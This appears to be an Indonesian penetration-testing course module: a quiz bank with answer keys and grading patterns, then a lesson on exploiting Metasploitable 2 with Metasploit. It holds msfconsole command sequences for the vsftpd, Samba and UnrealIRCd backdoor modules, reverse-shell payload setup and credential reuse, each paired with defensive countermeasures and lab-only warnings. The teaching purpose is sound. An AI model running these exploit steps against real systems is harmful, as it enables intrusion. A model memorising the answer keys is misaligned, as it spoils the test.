      fail:
        - 'set LHOST 192.168.56.1'
        - 'setg LHOST'
        - 'global LHOST 192.168.56.1'
    explanation: '`setg <opsi> <nilai>` menetapkan opsi **global** — berlaku di semua modul sampai `unsetg`. Praktis untuk nilai yang sama lintas modul: `setg LHOST <ip-kali>` (listener-mu tetap sama), `setg RHOSTS <target>`. Menghemat set ulang tiap ganti modul. `set` (tanpa g) hanya untuk modul aktif. Cek dengan `get`/`show options`. Hati-hati: nilai global bisa membuatmu lupa & menyerang target salah — di engagement multi-klien, pastikan RHOSTS global benar (disiplin scope, modul 01). Fitur kecil yang mempercepat kerja saat men-chain banyak modul terhadap target yang sama.'
    source: https://docs.rapid7.com/metasploit/

  - id: b10
    tier: B
    type: text
    objective: exploit
    prompt: Metasploit mempermudah eksploitasi, tapi kapan kamu tetap perlu memahami/menjalankan exploit manual (di luar msf)?
    answers: ['saat tak ada modul msf untuk kerentanan itu, exploit publik perlu disesuaikan, atau kamu butuh kontrol/pemahaman penuh (mis. exploit kustom/CTF)']
    patterns: ['(tak ada|belum ada)[^\n]*(modul|module)[^\n]*(msf|metasploit)', 'exploit (publik|manual|kustom)[^\n]*(sesuaikan|modifikasi|pahami)', '(kontrol|pemahaman) penuh|ctf']
    tests:
      fail: ['metasploit cukup untuk semua', 'tidak pernah perlu manual', 'exploit manual sudah usang', 'msf punya semua exploit']
    explanation: 'Metasploit hebat tapi tak mencakup semua: kamu perlu exploit manual ketika **tak ada modul msf** untuk kerentanan itu (exploit baru/niche hanya ada di Exploit-DB/GitHub, modul 04), exploit publik **perlu disesuaikan** (offset, payload, target spesifik), atau kamu butuh **kontrol & pemahaman penuh** (CTF, exploit kustom, menghindari deteksi signature msf). Bergantung total pada msf membuatmu buntu saat "tombol exploit" tak ada. Karena itu modul 04 mengajarkan searchsploit & membaca/menyesuaikan exploit. Metasploit mempercepat yang umum; pemahaman manual menangani sisanya. Pentester yang matang nyaman di keduanya — framework untuk efisiensi, manual untuk fleksibilitas.'
    source: https://www.exploit-db.com/searchsploit

  - id: b11
    tier: B
    type: text
    objective: aux
    prompt: Setelah mendapat kredensial (dari brute/loot), bagaimana Metasploit membantu memakainya ulang di servis/host lain?
    answers: ['simpan di creds db lalu pakai modul login (ssh_login/smb_login) atau psexec untuk credential reuse/lateral movement ke host/servis lain']
    patterns: ['(creds|kredensial)[^\n]*(simpan|tersimpan|disimpan)[^\n]*(db|database)', '(ssh_login|smb_login|psexec|login module|modul login)', 'lateral movement|credential reuse|pakai ulang[^\n]*(host|servis|lain)']
    tests:
      fail: ['kredensial tidak bisa dipakai ulang', 'metasploit tidak menyimpan kredensial', 'tidak ada manfaat', 'harus mulai dari nol']
    explanation: 'Kredensial yang didapat (brute, loot, hashdump) disimpan di database msf (`creds`). Metasploit membantu **credential reuse / lateral movement**: pakai kredensial itu di modul login (`ssh_login`, `smb_login`, `mysql_login`) terhadap host/servis LAIN, atau `psexec` (jalankan perintah via SMB dengan kredensial valid). Karena orang **pakai ulang password** lintas sistem, satu kredensial bocor sering membuka banyak pintu (ATT&CK Lateral Movement). Ini mengubah satu pijakan jadi penguasaan luas. Sisi blue (board DevSecOps modul 03/04): password unik per sistem, MFA, least privilege, dan segmentasi membatasi credential reuse — satu kredensial bocor tak boleh = semua jatuh.'
    source: https://docs.rapid7.com/metasploit/

  - id: b12
    tier: B
    type: text
    objective: purple
    prompt: Bagaimana sisi blue mendeteksi eksploitasi Metasploit yang sedang/baru terjadi?
    answers: ['deteksi anomali: koneksi keluar tak terduga (reverse shell), proses/shell baru di servis, pola payload/signature di IDS, dan log servis yang crash/aneh']
    patterns: ['(koneksi keluar|outbound|reverse)[^\n]*(tak terduga|anomali|baru)', '(proses|shell)[^\n]*(baru|asing|tak terduga)[^\n]*(servis)?', '(ids|signature|payload|log)[^\n]*(deteksi|pola|crash)']
    tests:
      fail: ['eksploitasi tidak terdeteksi', 'metasploit tak meninggalkan jejak', 'blue team buta', 'tidak ada sinyal']
    explanation: 'Eksploitasi meninggalkan jejak yang blue deteksi (board DevSecOps modul 09): **koneksi keluar tak terduga** (reverse shell menelepon ke IP penyerang — IOC kuat), **proses/shell baru** yang dilahirkan oleh servis (mis. Apache/vsftpd tiba-tiba spawn `/bin/sh` — Falco/auditd menangkap ini), **signature payload** Metasploit di IDS/IPS (banyak payload msf punya pola dikenal — makanya attacker meng-encode/obfuscate), dan **log servis** yang crash/error aneh saat exploit tak mulus. Runtime detection (Falco) sangat efektif: "shell di dalam servis yang seharusnya tak pernah spawn shell" = alarm. Deteksi + egress deny + patch = eksploitasi tersendat di banyak titik. Inilah mengapa red perlu paham deteksi, dan blue perlu paham exploit.'
    source: https://attack.mitre.org/techniques/T1210/

  - id: b13
    tier: B
    type: text
    objective: exploit
    prompt: Mengapa "exploit berhasil di lab Metasploitable" tidak otomatis berarti "berhasil di sistem nyata"?
    answers: ['sistem nyata ter-patch/hardened, punya EDR/WAF/monitoring, versi beda, dan egress dibatasi — exploit n-day lama Metasploitable umumnya sudah tertutup']
    patterns: ['(nyata|produksi)[^\n]*(patch|hardened|edr|waf|monitoring|ter-?update)', '(versi|servis)[^\n]*(beda|baru|ditambal)', '(n-?day|exploit lama)[^\n]*(tertutup|ditambal|tak jalan)|egress']
    tests:
      fail: ['selalu berhasil sama di dunia nyata', 'tidak ada bedanya', 'sistem nyata sama rentannya', 'patch tidak berpengaruh']
    explanation: 'Metasploitable sengaja usang & tanpa pertahanan — "sparring partner" yang diam dipukul. Sistem nyata umumnya: **ter-patch** (exploit n-day lama Metasploitable sudah tertutup, modul 04 b13), **hardened** (non-root, least privilege, modul 06), punya **EDR/WAF/IDS** (mendeteksi & memblokir, b12), **versi berbeda** (exploit tak cocok, modul 04 a10), dan **egress dibatasi** (reverse shell gagal, b08). Jadi exploit yang instan di lab sering tak jalan di produksi terurus — itu BAGUS (artinya pertahanan bekerja). Yang transfer adalah **metodologi & skill**, bukan exploit spesifik (ini jawaban langsung ke pertanyaanmu: skill-nya nyata, target yang terawat memang lebih keras — dan itulah tujuan sisi blue).'
    source: https://docs.rapid7.com/metasploit/metasploitable-2/

  - id: b14
    tier: B
    type: command
    objective: sessions
    prompt: Latarbelakangkan (background) sesi yang sedang aktif tanpa menutupnya, agar kembali ke prompt msfconsole.
    answers: ['background']
    patterns: ['^background([ \t]|$)', '^bg([ \t]|$)']
    tests:
      pass:
        - 'background'
        - 'bg'
      fail:
        - 'exit'
        - 'quit'
        - 'sessions -k'
    explanation: 'Dari dalam sesi (Meterpreter/shell), `background` (atau `bg`, atau `Ctrl+Z`) mengembalikanmu ke prompt msfconsole **tanpa menutup sesi** — sesi tetap hidup di latar (`sessions -l` menunjukkannya). Berguna untuk: menjalankan modul lain, berpindah antar sesi, atau menjalankan modul post-ex yang butuh id sesi. `exit`/`quit` dari sesi bisa MENUTUP sesi (kehilangan akses!) — hati-hati bedakan. `sessions -k <id>` sengaja menutup. Mengelola beberapa sesi aktif dengan rapi (background/interact) adalah skill praktis saat engagement dengan banyak akses. Jaga sesi tetap hidup = jaga akses yang susah payah didapat.'
    source: https://docs.rapid7.com/metasploit/

  - id: b15
    tier: B
    type: text
    objective: purple
    prompt: "Ringkas: satu exploit Metasploit terhadap servis rentan memetakan ke lapisan pertahanan blue mana saja?"
    answers: ['patch (tutup vuln), non-root (batasi dampak), egress deny (gagalkan reverse shell), deteksi runtime/log (tangkap shell/koneksi), segmentasi (batasi lateral)']
    patterns: ['patch[^\n]*(vuln|kerentanan|servis)', 'non-?root|least privilege', 'egress[^\n]*(deny|batasi)', '(deteksi|runtime|falco|log)[^\n]*(shell|koneksi)', 'segmentasi']
    tests:
      fail: ['hanya satu pertahanan', 'tidak bisa dipetakan', 'exploit tak ada counter', 'pertahanan tidak relevan']
    explanation: 'Satu exploit = banyak lapisan pertahanan (defense-in-depth, inti purple & board DevSecOps): **Patch/upgrade** (modul 05 blue) menutup kerentanannya → exploit tak ada sasaran. **Non-root/hardening** (modul 06) → RCE hanya dapat user terbatas, bukan root. **Egress deny** (modul 01/08) → reverse shell tak bisa menelepon pulang. **Deteksi runtime/log** (modul 09, Falco/auditd) → shell/koneksi tak terduga memicu alarm. **Segmentasi** → lateral movement terbatas. Penyerang harus menang di SETIAP lapisan; blue cukup menang di satu untuk menggagalkan/mendeteksi. Inilah peta purple yang akan dirangkum modul 09 — tiap teknik red punya tumpukan counter blue.'
    source: https://attack.mitre.org/techniques/T1210/

  # ---------------------------------------------------------------- Tier C
  - id: c01
    tier: C
    type: scenario
    objective: msfworkflow
    prompt: |
      Analisis kerentanan (modul 04) menandai vsftpd 2.3.4 (21) sebagai target termudah di Metasploitable. Rancang
      langkah mengeksploitasinya dengan Metasploit dari awal sampai dapat shell (satu poin per baris).
    checklist:
      - id: start
        label: Jalankan msfconsole & (opsional) db_import hasil scan
        required: true
        patterns: ['msfconsole', 'db_import|db_status|database']
      - id: search-use
        label: search vsftpd → use exploit/unix/ftp/vsftpd_234_backdoor
        required: true
        patterns: ['search[^\n]*vsftpd|use[^\n]*vsftpd', 'use[^\n]*(exploit|234_backdoor)']
      - id: options
        label: show options & set RHOSTS (target)
        required: true
        patterns: ['show options', 'set[^\n]*rhosts']
      - id: payload
        label: Pastikan payload/LHOST sesuai (bila perlu reverse)
        patterns: ['payload|lhost', 'set[^\n]*(payload|lhost)']
      - id: exploit
        label: Jalankan exploit lalu konfirmasi sesi (id/whoami)
        patterns: ['exploit|run', '(sessions|id|whoami|konfirmasi)[^\n]*(sesi|akses|shell)?']
      - id: document
        label: Dokumentasikan akses (bukti confirmed) untuk laporan
        patterns: ['dokumentasi|catat|bukti|laporan']
      - id: no-random
        label: Tidak menjalankan exploit acak tanpa set opsi/konfirmasi
        forbid: true
        patterns: ['^(?![^\n]*(jangan|bukan|tidak|selain))[^\n]*(jalankan|tembak)[^\n]*exploit[^\n]*(acak|asal|tanpa set|sembarang)']
    pass_score: 0.5
    solution: |
      ```text
      1. msfconsole  (db_status; db_import scan.xml bila ada → hosts/services siap).
      2. search vsftpd → use exploit/unix/ftp/vsftpd_234_backdoor.
      3. show options → set RHOSTS 192.168.56.101 (cek RPORT default 21).
      4. Payload: exploit ini membuka shell langsung (cmd), pastikan sesuai; untuk reverse lain set LHOST/PAYLOAD.
      5. exploit → dapat shell; konfirmasi: id / whoami (kemungkinan root — servis jalan sebagai root).
      6. Dokumentasikan: screenshot shell + id = bukti "confirmed access" untuk laporan (modul 10).
      ```
      Alur disiplin: msfconsole → search → use → show options → set → exploit → konfirmasi → dokumentasi. Jangan tembak
      exploit tanpa set opsi (RHOSTS) & tanpa konfirmasi sesi — itu menebak, bukan mengeksploitasi.
    tests:
      pass:
        - |
          jalankan msfconsole dan opsional db_import hasil scan
          search vsftpd lalu use exploit unix ftp vsftpd_234_backdoor
          show options dan set rhosts ke ip target
          pastikan payload dan lhost sesuai bila perlu reverse
          jalankan exploit lalu konfirmasi sesi dengan id atau whoami
          dokumentasikan akses sebagai bukti confirmed untuk laporan
          jangan jalankan exploit acak tanpa set opsi atau konfirmasi
        - |
          buka msfconsole, search dan use modul vsftpd backdoor, show options set rhosts
          set payload lhost bila reverse, exploit lalu cek id whoami, dokumentasikan bukti, jangan asal tembak
      fail:
        - |
          jalankan exploit acak tanpa set rhosts
          tidak perlu konfirmasi sesi atau dokumentasi
        - |
          tembak semua modul vsftpd sembarang
          tidak usah show options
        - |
          langsung exploit tanpa msfconsole
          abaikan payload dan target
    source: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/

  - id: c02
    tier: C
    type: scenario
    objective: purple
    prompt: |
      Purple: kamu baru mengeksploitasi sebuah servis rentan di Metasploitable dan mendapat shell root. Rancang
      bagaimana tim BLUE mencegah & mendeteksi serangan serupa di sistem nyata (satu poin per baris).
    checklist:
      - id: patch
        label: Patch/upgrade servis usang (tutup kerentanannya)
        required: true
        patterns: ['patch|upgrade|update[^\n]*(servis|versi|usang)', 'tutup[^\n]*(kerentanan|vuln)']
      - id: nonroot
        label: Jalankan servis non-root + hardening (RCE tak langsung = root)
        required: true
        patterns: ['non-?root|least privilege', '(rce|jebol|kompromi)[^\n]*(bukan|tidak)[^\n]*(root|langsung)|hardening']
      - id: egress
        label: Batasi egress (default-deny outbound) → reverse shell gagal
        patterns: ['egress[^\n]*(batasi|deny)', '(outbound|keluar)[^\n]*(batasi|blokir|deny)', 'reverse shell[^\n]*(gagal|cegah)']
      - id: detect
        label: Deteksi runtime & log (shell baru di servis, koneksi keluar tak terduga)
        required: true
        patterns: ['(deteksi|runtime|falco|auditd|log)[^\n]*(shell|koneksi|proses)', '(koneksi keluar|outbound)[^\n]*(tak terduga|anomali)']
      - id: segment
        label: Segmentasi jaringan (batasi lateral movement)
        patterns: ['segmentasi', '(batasi|cegah)[^\n]*lateral']
      - id: no-single
        label: Tidak mengandalkan satu kontrol (mis. hanya patch / hanya firewall)
        forbid: true
        patterns: ['^(?![^\n]*(jangan|bukan|tidak|selain))[^\n]*(cukup|hanya|andalkan)[^\n]*(patch|firewall|satu kontrol)[^\n]*(saja|cukup)']
    pass_score: 0.5
    solution: |
      ```text
      1. Patch/upgrade servis usang → kerentanan tertutup, exploit tak ada sasaran (DevSecOps 05; n-day = jalan masuk utama).
      2. Non-root + hardening (cap-drop, no-new-priv) → RCE hanya dapat user terbatas, bukan root langsung (DevSecOps 06).
      3. Egress default-deny → reverse shell tak bisa menelepon pulang; blokir C2 & exfiltrasi (DevSecOps 01/08).
      4. Deteksi runtime (Falco/auditd) + log → shell yang di-spawn servis & koneksi keluar tak terduga = alarm (DevSecOps 09).
      5. Segmentasi jaringan → kalaupun jebol, lateral movement ke host lain terbatas.
      ```
      Berlapis: tiap lapisan menutup/mendeteksi tahap berbeda dari exploit yang sama. Mengandalkan satu kontrol (hanya
      patch, atau hanya firewall) meninggalkan celah — penyerang hanya perlu satu lapisan terlewat, blue perlu semua.
    tests:
      pass:
        - |
          patch dan upgrade servis usang untuk menutup kerentanannya
          jalankan servis non root dengan hardening agar rce tidak langsung jadi root
          batasi egress default deny outbound sehingga reverse shell gagal menelepon pulang
          deteksi runtime dan log dengan falco auditd untuk shell baru di servis dan koneksi keluar tak terduga
          segmentasi jaringan untuk membatasi lateral movement
          jangan mengandalkan satu kontrol seperti hanya patch atau hanya firewall
        - |
          patch servis usang, non root plus hardening, egress deny untuk gagalkan reverse shell
          deteksi runtime falco untuk shell dan koneksi anomali, segmentasi batasi lateral, bukan satu kontrol saja
      fail:
        - |
          cukup pasang firewall saja sudah aman
          tidak perlu patch atau deteksi
        - |
          andalkan satu patch lalu selesai
          non root dan egress tidak penting
        - |
          biarkan servis root asalkan ada antivirus
          tidak usah deteksi runtime
    source: https://attack.mitre.org/techniques/T1210/

  - id: c03
    tier: C
    type: scenario
    objective: exploit
    prompt: |
      Exploit kamu "berhasil" (tidak error) tapi tidak ada sesi yang terbuka. Rancang langkah troubleshooting yang
      sistematis (satu poin per baris).
    checklist:
      - id: lhost
        label: Cek LHOST benar & terjangkau target (ping/route dari target bila bisa)
        required: true
        patterns: ['lhost[^\n]*(benar|cek|terjangkau|salah)', '(ping|route)[^\n]*(lhost|target|kali)']
      - id: payload
        label: Cek payload cocok OS/arsitektur target
        required: true
        patterns: ['payload[^\n]*(cocok|sesuai|os|arsitektur)', '(os|arsitektur)[^\n]*payload']
      - id: options
        label: show options — semua opsi required terisi (RHOSTS/RPORT/LPORT)
        patterns: ['show options', '(rhosts|rport|lport|opsi required)[^\n]*(terisi|benar|cek)']
      - id: firewall
        label: Pertimbangkan firewall (egress target / inbound Kali) memblokir koneksi balik
        patterns: ['firewall[^\n]*(blokir|cegah|egress|inbound)', '(egress|inbound)[^\n]*(blokir|cek)']
      - id: altpayload
        label: Coba bind shell / payload lain, atau exploit -j + sessions
        patterns: ['bind shell|payload lain|ganti payload', 'exploit -j|sessions']
      - id: verify-version
        label: Verifikasi versi/target benar-benar cocok (mungkin exploit gagal diam)
        patterns: ['(verifikasi|cek)[^\n]*(versi|target)[^\n]*(cocok|benar)', 'exploit gagal diam|show targets']
      - id: no-giveup
        label: Tidak langsung menyimpulkan "target aman" tanpa troubleshooting
        forbid: true
        patterns: ['^(?![^\n]*(jangan|bukan|tidak|selain|sebelum))[^\n]*(langsung|cukup)[^\n]*(simpulkan|menyerah)[^\n]*(target aman|tidak rentan|gagal)']
    pass_score: 0.45
    solution: |
      ```text
      1. Cek LHOST: benar IP Kali di subnet lab? target bisa menjangkaunya? (penyebab #1 shell tak datang — reverse).
      2. Cek payload cocok OS/arsitektur target (payload salah → crash saat jalan, modul 04 a10).
      3. show options: semua Required terisi (RHOSTS, RPORT, LPORT); salah/ kosong → exploit tak mengenai sasaran.
      4. Firewall: egress target memblokir koneksi balik? inbound Kali memblokir listener? (egress deny = reverse gagal, b08).
      5. Coba alternatif: bind shell (bila reverse gagal), payload lain, atau exploit -j lalu cek sessions.
      6. Verifikasi versi/target benar-benar cocok (show targets) — exploit mungkin gagal diam karena versi tak persis.
      ```
      Troubleshooting sistematis: LHOST → payload → opsi → firewall → alternatif → versi. "Tidak ada sesi" jarang berarti
      "target aman" — lebih sering konfigurasi/kompatibilitas. Jangan menyerah/menyimpulkan tanpa menelusuri ini.
    tests:
      pass:
        - |
          cek lhost benar dan terjangkau target dengan ping atau route
          cek payload cocok dengan os dan arsitektur target
          show options pastikan semua opsi required terisi rhosts rport lport
          pertimbangkan firewall egress target atau inbound kali memblokir koneksi balik
          coba bind shell atau payload lain atau exploit -j lalu cek sessions
          verifikasi versi dan target benar cocok karena exploit mungkin gagal diam
          jangan langsung menyimpulkan target aman tanpa troubleshooting
        - |
          periksa lhost terjangkau, payload cocok os, show options required terisi
          cek firewall egress, coba bind shell atau payload lain, verifikasi versi show targets, jangan buru-buru menyerah
      fail:
        - |
          langsung simpulkan target aman dan tidak rentan
          tidak perlu cek lhost atau payload
        - |
          menyerah saja kalau tidak ada sesi
          firewall dan versi tidak penting
        - |
          ganti target lain tanpa troubleshooting
          show options tidak perlu
    source: https://www.offsec.com/metasploit-unleashed/
---

# Eksploitasi dengan Metasploit

Mengubah kerentanan prioritas (modul 04) menjadi **akses nyata**. Metasploit Framework membungkus exploit jadi modul
terstandar — kamu tinggal `search → use → set → exploit`. Modul ini pada servis rentan Metasploitable, dipetakan ke
pertahanan blue.

> [!NOTE]
> Modul ini **didokumentasikan** dari alur Metasploit standar — perintah & exploit **kamu jalankan di
> Kali+Metasploitable**, bukan dieksekusi penulis (`status: draft`; penulis tidak menjalankan exploit di sesi ini).
> Servis/kerentanan yang dirujuk adalah kerentanan terdokumentasi Metasploitable 2. Semua pada target milik sendiri.

## 1. Alur inti msfconsole

```text
msfconsole                                     buka framework (db_status untuk cek database)
search vsftpd                                  cari modul (dari versi, modul 04)
use exploit/unix/ftp/vsftpd_234_backdoor       pilih modul
show options                                   lihat opsi (Required: RHOSTS, dll)
set RHOSTS 192.168.56.101                       target (RHOSTS=target, LHOST=mesinmu!)
set PAYLOAD .../reverse_tcp ; set LHOST <kali>  payload + listener (reverse, a06/a12)
exploit                                         jalankan → dapat sesi
sessions -l ; sessions -i 1                     daftar & masuk sesi
id ; whoami ; uname -a                          orientasi: siapa aku? OS apa?
```

## 2. Payload: reverse vs bind

- **Reverse shell**: target menelepon balik ke `LHOST:LPORT` (lolos firewall outbound — umum). Wajib set `LHOST`.
- **Bind shell**: target buka port, penyerang connect (sering diblokir firewall inbound).
- `msfvenom` membuat payload file (`.php`/`.exe`/`.elf`) untuk diunggah manual (upload/command injection, modul 06).

## 3. Low-hanging fruit Metasploitable (contoh)

| Servis | Modul msf | Kerentanan |
|---|---|---|
| vsftpd 2.3.4 (21) | `exploit/unix/ftp/vsftpd_234_backdoor` | backdoor supply-chain → shell root |
| Samba 3.x (445) | `exploit/multi/samba/usermap_script` | command injection CVE-2007-2447 → root |
| UnrealIRCd (6667) | `exploit/unix/irc/unreal_ircd_3281_backdoor` | backdoor supply-chain → shell |
| MySQL (3306) | `auxiliary/scanner/mysql/mysql_login` | root tanpa password |

Banyak servis Metasploitable jalan **sebagai root** → RCE = **root langsung** (pelajaran blue: non-root!).

## 4. Metasploit = platform lengkap

`exploit` (dapat akses) · `auxiliary` (scan/enum/brute: `ssh_login`, `smb_version`) · `post` (post-ex, modul 08) ·
`payload`. `db_import` scan (modul 02) → `hosts`/`services`/`creds` terkelola. `setg` untuk opsi global.

## 5. Kalau gagal (troubleshooting)

"Exploit berhasil tapi tak ada sesi" → cek: **LHOST** benar & terjangkau? **payload** cocok OS/arsitektur? opsi
**Required** terisi? **firewall/egress** memblokir koneksi balik? Coba bind shell / payload lain / `exploit -j`.

## 6. Purple — satu exploit, banyak counter

| Eksploitasi (red) | Pertahanan (blue — DevSecOps) |
|---|---|
| exploit kerentanan servis | patch/upgrade servis usang (05) |
| RCE → root (servis root) | jalankan non-root + hardening (06) |
| reverse shell menelepon pulang | egress default-deny (01/08) |
| shell/koneksi di servis | deteksi runtime Falco/auditd + log (09) |
| lateral movement via kredensial | segmentasi, password unik, MFA (03/04) |
| backdoor supply-chain (vsftpd/Unreal) | verifikasi integritas, signing, SBOM (05/11) |

> [!WARNING]
> Eksploitasi HANYA pada Metasploitable milik sendiri di lab terisolasi (ATT&CK T1210). Jangan jalankan exploit yang
> belum dibaca/dipahami (modul 04). Exploit di lab yang instan sering tak jalan di sistem nyata yang ter-patch &
> dipertahankan — itu justru bukti pertahanan bekerja (b13), dan tujuan sisi blue-mu.

> [!NOTE]
> Lanjut ke modul 06 (Eksploitasi Web) — menyerang aplikasi web rentan Metasploitable (DVWA/Mutillidae): SQL
> injection, file upload, command injection — kelas yang sama dengan board DevSecOps modul 07 dari sisi penyerang.
